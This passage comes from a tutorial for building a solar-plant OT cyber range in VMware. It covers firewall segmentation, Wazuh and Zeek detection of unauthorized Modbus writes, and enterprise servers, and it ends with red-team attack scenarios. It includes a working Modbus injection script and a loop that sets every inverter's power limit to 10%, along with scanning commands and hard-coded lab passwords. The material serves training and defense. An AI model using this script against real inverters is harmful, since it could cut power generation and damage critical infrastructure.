and communicate with WS-A VMs through pfSense-External and the physical LAN.

```
CROSS-WORKSTATION COMMUNICATION ARCHITECTURE (v5.0 — Corrected):

WS-A Physical LAN IP: 192.168.1.XX  (home LAN — check: ipconfig)
WS-B Physical LAN IP: 192.168.1.YY  (home LAN)

WS-A internal VMs (Field-Sim, SCADA, Historian, Bastion):
→ Connected to VMnets 2-5 (Host-Only, isolated OT subnets)
→ Route through pfSense-Internal (also on WS-A)

WS-B VMs (Wazuh, AD, ERP, Kali):
→ Use Bridged networking to appear on home LAN (192.168.1.x)
→ OR use VMnet6 on WS-B for Enterprise-NET isolation

pfSense-Internal (WS-A) WAN faces VMnet6 (ENTERPRISE-NET)
pfSense-External (WS-B) bridges home LAN to ENTERPRISE-NET
→ pfSense-External LAN: 192.168.10.1 on VMnet6 (WS-B copy)
→ pfSense-Internal WAN: 192.168.10.254 on VMnet6 (WS-A copy)

⚠️ NOTE: VMnet6 on WS-A and VMnet6 on WS-B are SEPARATE Host-Only
networks. For them to communicate, pfSense-External must use a Bridged
adapter to the home LAN, and pfSense-Internal's WAN faces the home LAN
via bridged or through pfSense-External as a relay. The simplest approach:
→ Keep Wazuh and Kali Bridged to home LAN (visible to both workstations)
→ Use VMnet1 (HOST-MGMT) as a secondary adapter on OT VMs for Wazuh agents
→ Enable ICS (Internet Connection Sharing) on WS-A's main LAN adapter
   sharing to VMnet1, allowing VMnet1 VMs to reach home LAN (and Wazuh)
```

## STEP 30-32: pfSense Firewall Setup

> ### 🔵 Why pfSense-Internal Lives on WS-A (Not WS-B)
>
> pfSense-Internal must route between VMnet2 (OT-LEVEL1), VMnet3 (OT-LEVEL2),
> VMnet4 (OT-LEVEL3), VMnet5 (DMZ), and VMnet6 (Enterprise). All of these VMnets
> are Host-Only networks — they only exist within the VMware instance on the
> workstation where they were created. A VM on WS-B **cannot attach to WS-A's
> Host-Only VMnets** — Host-Only networks don't cross physical machines.
>
> Therefore pfSense-Internal **must run on WS-A** — the same physical machine
> where VMnet2 through VMnet6 are defined. This is why the initial hardware diagram
> assignment (pfSense on WS-B) was incorrect and is corrected in v5.0.

### 🟢 Action: Create pfSense-Internal VM on WS-A

```
Step 30.1: VMware on WS-A → New VM:
           Name: pfSense-Internal
           ISO: pfSense-CE-2.7.x-RELEASE-amd64.iso
           RAM: 1024 MB (pfSense is very efficient)
           CPU: 2 cores
           Disk: 10 GB
           
           Customize Hardware — Add FIVE network adapters:
           Network Adapter 1: VMnet2 (OT-LEVEL1-NET)  ← Field-Sim & Pi segment
           Network Adapter 2: VMnet3 (OT-LEVEL2-NET)  ← SCADA segment
           Network Adapter 3: VMnet4 (OT-LEVEL3-NET)  ← Historian segment
           Network Adapter 4: VMnet5 (DMZ-NET)         ← Bastion & Wazuh
           Network Adapter 5: VMnet6 (ENTERPRISE-NET)  ← AD & ERP
           
           WHY five adapters: pfSense IS the router between all five segments.
           It needs a network interface in each subnet it routes between.
           Including VMnet2 is CRITICAL — without it, SCADA (VMnet3) and
           Historian (VMnet4) can never reach the Pi PLC (on VMnet2/10.10.10.1).
           This was a missing interface in v4.0 that broke all PLC polling.

Step 30.2: Power on → pfSense installer:
           Accept → Install pfSense → Auto (ZFS or UFS) → Proceed
           Stripe → disk0 → Yes
           Installation takes 2-3 minutes
           Reboot

Step 31.1: pfSense first boot — interface assignment:
           Console menu appears.
           
           "Should VLANs be set up now?" → n (No)
           
           pfSense detects 5 NICs (vmx0 through vmx4). Assign them:
           
           "Enter the WAN interface name or 'a' for auto-detect":
           Type: vmx4  (VMnet6 / ENTERPRISE-NET — the "outer" side)
           
           "Enter the LAN interface name":
           Type: vmx1  (VMnet3 / OT-LEVEL2-NET — where SCADA lives)
           
           "Enter optional interface names":
           vmx0 → OPT1  (VMnet2 / OT-LEVEL1-NET — Pi & Field-Sim)
           vmx2 → OPT2  (VMnet4 / OT-LEVEL3-NET — Historian)
           vmx3 → OPT3  (VMnet5 / DMZ-NET — Bastion & Wazuh)
           
           Confirm: y
           
           ⚠️ IMPORTANT: If you're unsure which vmxN is which VMnet,
           temporarily remove all adapters in VMware settings, then add
           them back one by one in this order (VMnet2, VMnet3, VMnet4,
           VMnet5, VMnet6) — they will then map to vmx0 through vmx4.

Step 31.2: From pfSense console → Option 2 (Set interface IP):
           
           Set OPT1 (vmx0 / VMnet2 / OT-LEVEL1-NET):
           IP address: 10.10.10.254
           Subnet bit count: 24
           Upstream gateway: (leave blank — this is a LAN-side interface)
           DHCP server: n
           
           Set LAN (vmx1 / VMnet3 / OT-LEVEL2-NET):
           IP address: 10.10.20.254
           Subnet bit count: 24
           Upstream gateway: (leave blank)
           DHCP server: n
           
           Set OPT2 (vmx2 / VMnet4 / OT-LEVEL3-NET):
           IP: 10.10.30.254, /24
           
           Set OPT3 (vmx3 / VMnet5 / DMZ-NET):
           IP: 192.168.20.1, /24
           
           Set WAN (vmx4 / VMnet6 / ENTERPRISE-NET):
           IP: 192.168.10.254, /24
           Gateway: 192.168.10.1 (pfSense-External LAN IP — set up in Step 47)
           
           Summary of pfSense-Internal interfaces:
           ┌──────────────┬────────────┬──────────────────────┬──────────────────┐
           │ pfSense Port │ VMnet      │ Subnet               │ pfSense IP       │
           ├──────────────┼────────────┼──────────────────────┼──────────────────┤
           │ OPT1         │ VMnet2     │ 10.10.10.0/24        │ 10.10.10.254     │
           │ LAN          │ VMnet3     │ 10.10.20.0/24        │ 10.10.20.254     │
           │ OPT2         │ VMnet4     │ 10.10.30.0/24        │ 10.10.30.254     │
           │ OPT3         │ VMnet5     │ 192.168.20.0/24      │ 192.168.20.1     │
           │ WAN          │ VMnet6     │ 192.168.10.0/24      │ 192.168.10.254   │
           └──────────────┴────────────┴──────────────────────┴──────────────────┘

Step 32.1: Access pfSense web UI:
           From SCADA-Server VM (on OT-LEVEL2-NET, same subnet as pfSense LAN):
           Firefox → http://10.10.20.254
           Login: admin / pfsense → Change to: SolarFW2024!
           
           System → General Setup → Hostname: pfsense-internal → Save

Step 32.2: Configure firewall rules (Firewall → Rules):
           
           OPT1 (OT-LEVEL1-NET / 10.10.10.0/24) Rules:
           Allow: Field-Sim (10.10.10.10) → Pi PLC (10.10.10.1:502)   [Modbus]
           Allow: Pi PLC (10.10.10.1) → Field-Sim (10.10.10.10:5501-5520) [PLC polls devices]
           Allow: ICMP from 10.10.10.0/24 to 10.10.10.0/24             [internal pings]
           Block: OT-LEVEL1 → ENTERPRISE-NET (no direct upward comms)
           
           LAN (OT-LEVEL2-NET / 10.10.20.0/24) Rules:
           Allow: SCADA (10.10.20.10) → Pi PLC (10.10.10.1:502)        [SCADA polls PLC]
           Allow: SCADA (10.10.20.10) → Historian (10.10.30.10:8086)   [InfluxDB writes]
           Block: All other LAN → Enterprise
           
           OPT2 (OT-LEVEL3-NET / 10.10.30.0/24) Rules:
           Allow: Historian (10.10.30.10) → Pi PLC (10.10.10.1:502)    [historian polls PLC]
           Block: Historian → ENTERPRISE-NET
           
           OPT3 (DMZ-NET / 192.168.20.0/24) Rules:
           Allow: Wazuh (192.168.20.20) → all OT subnets (ports 1514,1515) [agent comms]
           Allow: Bastion (192.168.20.5) → all OT subnets (SSH port 22)
           Block: Everything else from DMZ → OT
           
           WAN (ENTERPRISE-NET / 192.168.10.0/24) Rules:
           Block: ENTERPRISE → OT-LEVEL1/2/3 direct
           Allow: ENTERPRISE → DMZ (Wazuh dashboard :443, Bastion SSH :22)
           
           WHY OPT1 rules matter: Without these rules, the Pi PLC cannot poll
           the Field-Simulator devices, and SCADA/Historian cannot poll the Pi.
           This was missing in v4.0 (pfSense had no VMnet2 interface at all).
```

---

## STEP 35-37: Wazuh SIEM on WS-B

### 🟢 Action: Create Wazuh VM on WS-B

```
Step 35.1: VMware on WS-B → New VM:
           Select "I will install the operating system later"
           Guest OS: Linux → Ubuntu 64-bit
           
           Name: Wazuh-SIEM
           Disk: 120 GB, single file
           
           Customize Hardware:
           RAM: 8192 MB  (Wazuh + OpenSearch = very memory hungry)
           CPU: 4 cores
           CD/DVD: ubuntu-24.04.4-live-server-amd64.iso
           Network Adapter 1: Bridged (to WS-B's physical LAN adapter)
           WHY Bridged: Wazuh must reach agents on BOTH WS-A and WS-B.
           Bridged gives it a real home-LAN IP visible to both workstations.
           NO second NAT adapter needed — Bridged already has internet.
           → Close → Finish → Power On

Step 35.2: Install Ubuntu 24.04.4 Server (same screen flow as Step 8.6):
           Server name: wazuh-siem
           Username: solaradmin / SolarLab2024!
           ✅ Install OpenSSH server (Screen 10 — mandatory)
           
           At the Network screen: the Bridged adapter should auto-get DHCP
           from your home router. If it shows an IP — good, mirror will work.
           
           After first boot:
           sudo apt update && sudo apt full-upgrade -y

Step 35.3: Set a static IP on Wazuh (so agents always know where to send logs):
           
           Find your home LAN subnet:
           ip addr show   ← look at the Bridged adapter's current DHCP IP
           Example: 192.168.1.xxx → your LAN is 192.168.1.0/24
           
           Find your gateway: ip route show default
           Example: default via 192.168.1.1
           
           Check the netplan directory (same as Step 8.9 — may be empty):
           ls /etc/netplan/
           If files exist, rename them (.bak). If empty, proceed directly.
           
           sudo nano /etc/netplan/10-solar-network.yaml
```

```yaml
network:
  version: 2
  renderer: networkd
  ethernets:
    ens33:                        # ← your Bridged adapter name (ip link show)
      dhcp4: false
      addresses:
        - 192.168.1.200/24        # ← choose a free static IP on your home LAN
      routes:
        - to: default
          via: 192.168.1.1        # ← your home router IP
      nameservers:
        addresses:
          - 8.8.8.8
          - 1.1.1.1
```

```
           sudo chmod 600 /etc/netplan/10-solar-network.yaml
           sudo netplan try → confirm
           
           Verify: ping 8.8.8.8 ← must work (Bridged = internet via home LAN)
           Verify: ping 192.168.1.200 from WS-A ← must reply

Step 36.1: Install Wazuh all-in-one (internet required — Bridged adapter provides it):
           curl -sO https://packages.wazuh.com/4.9/wazuh-install.sh
           chmod +x wazuh-install.sh
           sudo bash wazuh-install.sh -a
           
           WHY -a flag: All-in-one installs Wazuh Manager + OpenSearch Indexer
           + Dashboard in a single script. For our lab, single-node is fine.
           
           This takes 10-20 minutes. At the end, save the output carefully:
           Admin credentials:
           User: admin
           Password: <generated-password>   ← WRITE THIS DOWN NOW
           
           Access dashboard from WS-B browser:
           https://192.168.1.200
           Accept the self-signed certificate warning → log in with admin creds.

Step 37.1: Install Wazuh agents on all Ubuntu VMs:
           
           ⚠️ PREREQUISITE: Each OT VM needs internet to download the agent.
           If you've already removed the NAT adapter from Field-Sim/Historian/SCADA,
           temporarily re-add VMnet8 to each VM, install the agent, then remove it again.
           
           On each Ubuntu VM (Field-Simulator, SCADA-Server, Historian, Bastion):
           
           # Add Wazuh repository key:
           curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | \
             gpg --no-default-keyring \
             --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg \
             --import
           chmod 644 /usr/share/keyrings/wazuh.gpg
           
           # Add repository:
           echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] \
           https://packages.wazuh.com/4.x/apt/ stable main" | \
           sudo tee /etc/apt/sources.list.d/wazuh.list
           
           sudo apt update
           sudo apt install -y wazuh-agent
           
           # Point agent to Wazuh manager:
           sudo nano /var/ossec/etc/ossec.conf
           Find: <address>MANAGER_IP</address>
           Change to: <address>192.168.1.200</address>
           
           sudo systemctl enable --now wazuh-agent
           sudo systemctl restart wazuh-agent
           
           Wait 1-2 minutes → Wazuh Dashboard → Agents → agent appears "Active"
           
           After agent is confirmed active: remove VMnet8 from that VM (if reattached).
```

---

## STEP 38-39: Zeek IDS and Custom OT Rules

```
Step 38.1: Install Zeek on the Wazuh-SIEM VM (or a dedicated VM):
           sudo apt update
           sudo apt install -y cmake make gcc g++ flex bison libpcap-dev \
             libssl-dev python3-dev python3-pip swig zlib1g-dev
           
           # Install Zeek from binary packages for Ubuntu 24.04 (Noble):
           echo 'deb http://download.opensuse.org/repositories/security:/zeek/xUbuntu_24.04/ /' | \
           sudo tee /etc/apt/sources.list.d/security:zeek.list
           
           curl -fsSL https://download.opensuse.org/repositories/security:zeek/xUbuntu_24.04/Release.key | \
           gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/security_zeek.gpg > /dev/null
           
           sudo apt update
           sudo apt install -y zeek
           
           WHY Ubuntu 24.04 repo: Our VMs run Ubuntu 24.04 LTS (Noble Numbat).
           Using the 22.04 (Jammy) repo on a 24.04 system causes library
           version mismatches and broken dependencies. Always use the repo
           that matches your OS version.
           
           Add Zeek to PATH:
           echo 'export PATH=/opt/zeek/bin:$PATH' >> ~/.bashrc
           source ~/.bashrc

Step 38.2: Configure Zeek to monitor Modbus traffic:
           sudo nano /opt/zeek/etc/networks.cfg
           Add:
           10.10.10.0/24    OT-Level1
           10.10.20.0/24    OT-Level2
           10.10.30.0/24    OT-Level3
           
           sudo nano /opt/zeek/etc/node.cfg
           [zeek]
           type=standalone
           host=localhost
           interface=eth0   (or your primary interface name)

Step 39.1: Create custom Modbus detection rule for Zeek:
           sudo nano /opt/zeek/share/zeek/site/solar_ot_detection.zeek
```

```zeek
##! Custom OT security detection for Solar Plant Cyber Range
##! Detects unauthorized Modbus write commands and unusual traffic patterns

module SolarOT;

export {
    redef enum Log::ID += { LOG };

    type Info: record {
        ts:          time    &log;
        orig_h:      addr    &log;
        orig_p:      port    &log;
        resp_h:      addr    &log;
        resp_p:      port    &log;
        func_code:   count   &log &optional;
        description: string  &log;
        severity:    string  &log;
    };

    # Authorized Modbus masters (only these IPs should write to inverters)
    const authorized_modbus_masters: set[addr] = {
        10.10.10.1,   # Raspberry Pi PLC — ONLY authorized writer
    };
    
    # Authorized SCADA (can read PLC, not write to field devices)
    const authorized_scada: set[addr] = {
        10.10.20.10,  # SCADA-Server
    };
}

event zeek_init() {
    Log::create_stream(SolarOT::LOG, [$columns=Info, $path="solar_ot_alerts"]);
    print "SolarOT detection module loaded";
}

# Detect Modbus write commands (FC 6 = Write Single Register, FC 16 = Write Multiple)
event modbus_message(c: connection, headers: ModbusHeaders, is_orig: bool) {
    local func = headers$function_code;
    
    # Write commands: FC 5, 6, 15, 16
    if (func == 5 || func == 6 || func == 15 || func == 16) {
        local writer = is_orig ? c$id$orig_h : c$id$resp_h;
        
        if (writer !in authorized_modbus_masters) {
            local rec = Info(
                $ts = network_time(),
                $orig_h = c$id$orig_h,
                $orig_p = c$id$orig_p,
                $resp_h = c$id$resp_h,
                $resp_p = c$id$resp_p,
                $func_code = func,
                $description = fmt("UNAUTHORIZED Modbus WRITE from %s (FC=%d)", writer, func),
                $severity = "CRITICAL"
            );
            Log::write(SolarOT::LOG, rec);
            print fmt("[ALERT] Unauthorized Modbus write: %s → %s FC=%d", 
                     c$id$orig_h, c$id$resp_h, func);
        }
    }
}
```

```
Step 39.2: Load the custom script:
           echo "@load site/solar_ot_detection" | \
           sudo tee -a /opt/zeek/share/zeek/site/local.zeek
           
           sudo zeekctl deploy

Step 39.3: Custom Wazuh rules for OT:
           sudo nano /var/ossec/etc/rules/solar_plant_ot_rules.xml
```

```xml
<group name="solar_ot,modbus,">
  <!-- Alert on Modbus write commands from unauthorized sources -->
  <rule id="100100" level="12">
    <if_group>zeek</if_group>
    <match>UNAUTHORIZED Modbus WRITE</match>
    <description>OT CRITICAL: Unauthorized Modbus write command detected</description>
    <group>modbus_write,ot_attack,pci_dss_10.6.1,</group>
  </rule>

  <!-- Alert on repeated Modbus connection failures (scanning) -->
  <rule id="100101" level="10" frequency="10" timeframe="30">
    <if_matched_group>modbus</if_matched_group>
    <same_source_ip/>
    <description>OT HIGH: Modbus port scanning detected from same source</description>
    <group>ot_scan,</group>
  </rule>

  <!-- Alert on PLC service stopping -->
  <rule id="100102" level="13">
    <match>openplc.service</match>
    <match>stopped|failed</match>
    <description>OT CRITICAL: OpenPLC PLC service stopped — plant control lost</description>
    <group>plc_down,ot_availability,</group>
  </rule>
  
  <!-- Alert on inverter fault (from field simulator logs) -->
  <rule id="100103" level="8">
    <match>Inverter.*FAULT</match>
    <description>OT MEDIUM: Solar inverter entered fault state</description>
    <group>inverter_fault,</group>
  </rule>
</group>
```

```
           sudo systemctl restart wazuh-manager
```

---

## STEP 40: Validate Security Layer

```
Step 40.1: Test network segmentation:
           From Enterprise VM (192.168.10.x):
           ping 10.10.10.10   → SHOULD FAIL (blocked by pfSense)
           ping 10.10.20.10   → SHOULD FAIL
           
           From OT VM (10.10.20.10):
           ping 192.168.10.5  → SHOULD FAIL
           
           If pings succeed: Check pfSense rules, ensure "Block" rules are above default Allow.

Step 40.2: Verify Wazuh agents:
           Wazuh Dashboard → Agents → All agents should show Active status

Step 40.3: Test Zeek logging:
           Run the Modbus test from an unauthorized IP:
           On the SCADA VM (10.10.20.10 — unauthorized to WRITE):
           # Try a write command to field simulator
           python3 -c "
           from pymodbus.client import ModbusTcpClient
           c = ModbusTcpClient('10.10.10.10', port=5501)
           c.connect()
           c.write_register(20, 50, slave=1)  # Write power limit
           c.close()
           print('Write attempted')
           "
           
           Check Zeek log: sudo tail -f /opt/zeek/logs/current/solar_ot_alerts.log
           You should see an UNAUTHORIZED WRITE alert.
           
           Check Wazuh Dashboard: Security Events should show rule 100100 fired.
```

### 🟡 Verify: Security Layer Checkpoint

```
[ ] pfSense-Internal web UI accessible
[ ] Firewall rules: Enterprise → OT blocked (ping fails)
[ ] Wazuh dashboard: All agents Active (Field-Sim, SCADA, Historian, Bastion)
[ ] Zeek running: zeekctl status
[ ] Unauthorized Modbus write test: Zeek alert generated
[ ] Custom Wazuh rule 100100 fires on unauthorized Modbus write
[ ] Wazuh Dashboard shows alert
```

---

# ═══════════════════════════════════════════════════
# PHASE 6-7 — ENTERPRISE LAYER (WS-B)
# ═══════════════════════════════════════════════════

## STEP 41-43: ERP Odoo on WS-B

```
Step 41.1: Create ERP-Odoo VM on WS-B:
           Select "I will install the operating system later"
           Guest OS: Linux → Ubuntu 64-bit
           
           Name: ERP-Odoo
           Disk: 40 GB, single file
           
           Customize Hardware:
           RAM: 4096 MB
           CPU: 2 cores
           CD/DVD: ubuntu-24.04.4-live-server-amd64.iso
           Network Adapter 1: Bridged (to WS-B's LAN — gets home router IP)
           WHY Bridged: ERP lives in the Enterprise layer. Bridged gives
           it a real LAN IP reachable from the Enterprise network segment.
           NO second NAT adapter needed — Bridged already provides internet.
           → Close → Finish → Power On
           
           Follow Ubuntu 24.04.4 installer (same as Step 8.6):
           Hostname: erp-odoo
           Username: solaradmin / SolarLab2024!
           ✅ Install OpenSSH server
           
           After first boot, configure static IP via netplan:
           Check /etc/netplan/ (may be empty — create from scratch if so):
           sudo nano /etc/netplan/10-solar-network.yaml

Step 42.1: Install PostgreSQL + Odoo 17:
           sudo apt update
           sudo apt install -y postgresql postgresql-client
           sudo systemctl enable --now postgresql
           
           # Create Odoo database user:
           sudo -u postgres createuser -d -R -S odoo
           sudo -u postgres psql -c "ALTER USER odoo PASSWORD 'OdooLocal2024!';"
           
           # Install Odoo dependencies:
           sudo apt install -y python3-venv python3-pip python3-dev \
             build-essential libsasl2-dev libldap2-dev libssl-dev \
             libpq-dev nodejs npm git
           
           # Download Odoo 17:
           git clone https://github.com/odoo/odoo --depth 1 \
             --branch 17.0 /opt/odoo17
           
           # Create Odoo venv:
           python3 -m venv /opt/odoo17-venv
           source /opt/odoo17-venv/bin/activate
           pip install -r /opt/odoo17/requirements.txt
           
           # Configure Odoo:
           sudo nano /etc/odoo17.conf
```

```ini
[options]
admin_passwd = SolarOdoo2024!
db_host = localhost
db_port = 5432
db_user = odoo
db_password = OdooLocal2024!
addons_path = /opt/odoo17/addons
logfile = /var/log/odoo17.log
xmlrpc_port = 8069
```

```
           # Create systemd service:
           sudo nano /etc/systemd/system/odoo17.service
```

```ini
[Unit]
Description=Odoo 17 ERP
After=postgresql.service

[Service]
Type=simple
User=solaradmin
ExecStart=/opt/odoo17-venv/bin/python3 /opt/odoo17/odoo-bin \
    --config=/etc/odoo17.conf
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

```
           sudo systemctl daemon-reload
           sudo systemctl enable --now odoo17
           
           Access: http://<ERP-VM-IP>:8069
           Create database: solar_corp_db (select Manufacturing module)

Step 43.1: Configure Odoo for Solar Plant:
           Install modules: Manufacturing, Inventory, Maintenance, Accounting
           
           Create solar plant asset records:
           Inventory → Products → Add:
           - Solar Panels (330W × 3000 units)
           - Inverters (250 kW × 4 units)  
           - Battery System (500 kWh × 1 unit)
           
           Create maintenance plans:
           Maintenance → Maintenance Requests
           Schedule: Quarterly inverter inspection
```

---

## STEP 44-46: Active Directory Domain Controller on WS-B

```
Step 44.1: Create ActiveDirectory VM on WS-B:
           Name: ActiveDirectory
           ISO: SERVER_EVAL_x64FRE_en-us.iso
           RAM: 4096 MB
           CPU: 2 cores
           Disk: 60 GB
           Network: Bridged (LAN IP from router) or VMnet6
           
           Windows Server 2022 Installation:
           Language: English → Next → Install Now
           Select: Windows Server 2022 Standard Evaluation (Desktop Experience)
           WHY Desktop Experience: Includes the GUI for Server Manager.
           Core edition (no GUI) is harder to configure for first-timers.
           
           Custom installation → delete all partitions → New → Apply → OK → Next
           Installation: 15-25 minutes
           
           After install: Set Administrator password: SolarAD2024!

Step 45.1: Promote to Domain Controller:
           Server Manager → Manage → Add Roles and Features
           
           Role-based installation → Next × 3
           Select: Active Directory Domain Services → Add Features → Next → Install
           Wait for installation.
           
           Click: "Promote this server to a domain controller"
           
           Deployment Configuration:
           ○ Add a new forest
           Root domain name: solar-corp.local
           
           DC Options:
           Forest functional level: Windows Server 2016
           Domain functional level: Windows Server 2016
           ✅ DNS Server
           ✅ Global Catalog
           Password (DSRM): SolarDSRM2024!
           → Next → Next → Next → Install
           
           Server reboots automatically. Log in as:
           solar-corp\Administrator / SolarAD2024!

Step 46.1: Create Organizational Units and Users:
           Server Manager → Tools → Active Directory Users and Computers
           
           Right-click solar-corp.local → New → Organizational Unit
           Create OUs:
           - SolarPlant
             - OT-Engineers
             - IT-Staff
             - Management
           
           Create users:
           In OT-Engineers OU:
           Username: john.smith    Full name: John Smith (OT Engineer)
           Password: SolarOT2024!  ← Must change at first login
           
           In IT-Staff OU:
           Username: sarah.jones   Full name: Sarah Jones (IT Admin)
           Password: SolarIT2024!
           
           In Management OU:
           Username: plant.manager  Full name: Plant Manager
           Password: SolarMgr2024!
           
           Create security group: OT-Operators
           Add john.smith to OT-Operators
           
           WHY Groups: In a real plant, role-based access control (RBAC)
           uses AD groups. "OT-Operators" can access SCADA but not AD admin tools.
           "IT-Staff" can manage servers but not OT systems.
           This is IEC 62443 security zone requirement.
```

---

## STEP 47-48: pfSense External Perimeter on WS-B

```
Step 47.1: Create pfSense-External VM on WS-B:
           Name: pfSense-External
           ISO: pfSense-CE-2.7.x (same ISO as pfSense-Internal)
           RAM: 1024 MB
           CPU: 2 cores
           Disk: 10 GB
           
           Network Adapter 1: VMnet8 (NAT — "internet" / External)
           Network Adapter 2: Bridged (WS-B LAN — to reach Enterprise-NET)
           
           Install: same process as pfSense-Internal
           
           WAN: vmx0 (NAT interface — simulates internet connection)
           LAN: vmx1 (Bridged interface — enterprise network facing)
           
           LAN IP: 192.168.10.1/24 (ENTERPRISE-NET gateway)

Step 48.1: Configure perimeter rules:
           pfSense-External Web UI → http://192.168.10.1
           admin / pfsense → change to SolarFW-Ext2024!
           
           WAN Rules (simulated internet → enterprise):
           Block: All inbound by default (default WAN rule)
           
           LAN Rules (enterprise → internet):
           Allow: Enterprise hosts → internet (HTTP/HTTPS for software updates)
           Block: Enterprise → OT networks (must go through pfSense-Internal and Bastion)
```

---

# ═══════════════════════════════════════════════════
# PHASE 8 — RED TEAM (WS-B)
# ═══════════════════════════════════════════════════

## STEP 49-51: Kali Linux Red Team Station

```
Step 49.1: Create RedTeam-Kali VM on WS-B:
           Name: RedTeam-Kali
           ISO: kali-linux-2024.x-installer-amd64.iso
           RAM: 8192 MB (attack tools need RAM)
           CPU: 4 cores
           Disk: 80 GB
           Network: VMnet8 (NAT — simulates internet-connected attacker)
           
           Kali Installation:
           Graphical Install → English → your location → keyboard → Continue
           
           Hostname: kali-redteam
           Domain: (leave blank)
           Full name: Red Team
           Username: redteam
           Password: KaliSolar2024!
           
           Disk: Guided — use entire disk → All in one partition → Finish → Yes
           
           Software: ✅ Kali desktop environment, ✅ Top 10 tools
           → Continue
           
           GRUB: Yes → /dev/sda → Continue
           
           Reboot → login: redteam / KaliSolar2024!

Step 50.1: Install OT-specific attack tools:
           sudo apt update && sudo apt upgrade -y
           
           sudo apt install -y python3-pymodbus python3-scapy \
             mbtget nmap masscan wireshark metasploit-framework
           
           pip3 install pymodbus==3.6.9 scapy
           
           # Industrial Security Framework (ISF):
           cd ~/tools
           git clone https://github.com/dark-lbp/isf
           cd isf && pip3 install -r requirements.txt
           
           # GoPhish for phishing simulation:
           wget https://github.com/gophish/gophish/releases/latest/download/gophish-linux-64bit.zip
           unzip gophish-linux-64bit.zip -d ~/tools/gophish/

Step 51.1: Create attack scripts library:
           mkdir -p ~/solar_attacks
           
           nano ~/solar_attacks/modbus_inject.py
```

```python
#!/usr/bin/env python3
"""
Attack Tool: Modbus Register Injection
Simulates unauthorized write to inverter power limit register.
Use ONLY in authorized lab environment.
"""
from pymodbus.client import ModbusTcpClient
import argparse, sys

def inject_power_limit(host, port, inverter_id, limit_pct):
    print(f"[*] Connecting to inverter at {host}:{port}")
    c = ModbusTcpClient(host, port=port, timeout=5)
    if not c.connect():
        print(f"[-] Connection failed to {host}:{port}")
        return False
    
    # Write power limit register (register 20 in inverter register map)
    result = c.write_register(20, limit_pct, slave=1)
    if result.isError():
        print(f"[-] Write FAILED: {result}")
        c.close()
        return False
    
    print(f"[+] SUCCESS: Inverter-{inverter_id} power limit set to {limit_pct}%")
    print(f"[!] Expected effect: Plant output reduced by {100-limit_pct}%")
    c.close()
    return True

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Modbus power limit injector")
    parser.add_argument("host", help="Target inverter IP")
    parser.add_argument("port", type=int, help="Modbus port")
    parser.add_argument("--limit", type=int, default=0, help="Power limit % (0=shutdown)")
    args = parser.parse_args()
    
    print("=" * 50)
    print("  SOLAR GUARD RED TEAM — Modbus Injection Tool")
    print("  FOR AUTHORIZED LAB USE ONLY")
    print("=" * 50)
    inject_power_limit(args.host, args.port, 1, args.limit)
```

---

# ═══════════════════════════════════════════════════
# PHASE 9 — ATTACK SCENARIOS (Red vs. Blue)
# ═══════════════════════════════════════════════════

## STEP 52: Execute Attack Scenarios

### 🔵 Before Every Attack Scenario

```
MANDATORY PRE-ATTACK CHECKLIST:
[ ] Take VMware snapshot of ALL VMs (VM menu → Snapshot → Take Snapshot)
    Name: "Pre-Attack-Scenario-[N]-[Date]"
[ ] Start Wazuh alerts dashboard (Security Events → Live view)
[ ] Start Zeek logging (verify zeekctl status)
[ ] Start Grafana dashboard in browser (watch for power drops)
[ ] Have incident report template ready (see portfolio section)

AFTER EVERY ATTACK:
[ ] Document: Start time, what was done, what was observed
[ ] Screenshot: Wazuh alerts generated
[ ] Screenshot: Grafana power drop graph
[ ] Screenshot: Zeek alert logs
[ ] Restore: Reset any changed register values
[ ] Revert VMs if needed (Snapshot → Restore)
```

### Scenario 1: Modbus Register Injection (Power Curtailment Attack)

```
THREAT MODEL: External attacker who has breached the enterprise network and 
pivoted to OT-LEVEL1-NET. They want to reduce solar plant output to cause
financial damage and demonstrate control of the OT environment.

MITRE ATT&CK ICS: T0831 (Manipulation of Control), T0836 (Modify Parameter)

RED TEAM ACTIONS (on Kali VM):
Step 52.1.1: Move Kali network to OT-LEVEL1-NET (for testing — simulate pivot):
             Kali VM Settings → Network → Custom: VMnet2 (OT-LEVEL1-NET)
             Configure Kali static IP: 10.10.10.99
             
             sudo ip addr add 10.10.10.99/24 dev eth0
             sudo ip route add default via 10.10.10.254
             
             WHY gateway 10.10.10.254: pfSense-Internal is the router for
             OT-LEVEL1-NET. Do NOT use 10.10.10.1 (the Pi) — the Pi is a
             PLC endpoint and does not forward packets.

Step 52.1.2: Discover targets:
             nmap -sV -p 502,5501,5502,5503,5504,5510 10.10.10.0/24
             
             Note: Inverter ports (5501-5504) are on Field-Simulator (10.10.10.10)
             PLC Modbus slave is on Pi (10.10.10.1:502)

Step 52.1.3: Execute injection attack on all inverters:
             for port in 5501 5502 5503 5504; do
               python3 ~/solar_attacks/modbus_inject.py 10.10.10.10 $port --limit 10
             done
             
             This sets ALL inverters to 10% power limit.
             Expected: Plant output drops from ~1000 kW to ~100 kW.

BLUE TEAM OBSERVATIONS:
[ ] Grafana: Plant output drops from ~1000 kW to ~100 kW (dramatic drop visible)
[ ] Wazuh: Rule 100100 fires — "Unauthorized Modbus write command detected"
    Source: 10.10.10.99 (Kali), Destination: 10.10.10.10 (inverters)
[ ] Zeek solar_ot_alerts.log: UNAUTHORIZED WRITE entries from 10.10.10.99
[ ] ScadaBR: Alarms fire — "alarm_low_generation" (plant below expected output)
[ ] OpenPLC: Monitoring shows power limit registers changed to 10

BLUE TEAM RESPONSE:
Step 52.1.4: Identify: Wazuh alert → source IP 10.10.10.99 (not authorized)
Step 52.1.5: Contain: pfSense-Internal → Block rule for 10.10.10.99
Step 52.1.6: Remediate: OpenPLC → Force %QW100-103 back to 100 (full power)
Step 52.1.7: Document: Write incident report (see portfolio)

RESTORE:
python3 ~/solar_attacks/modbus_inject.py 10.10.10.10 5501 --limit 100
(Repeat for all 4 inverters)
Move Kali back to VMnet8 (NAT)
Remove pfSense block rule (or leave as evidence)
```

### Scenario 2: SCADA HMI Manipulation

```
THREAT MODEL: Insider threat — disgruntled IT employee with access to 
enterprise network pivots to SCADA via Bastion host and alters alarm 
thresholds to blind operators to real faults.

MITRE ATT&CK ICS: T0838 (Modify Alarm Settings), T0806 (Brute Force I&C)

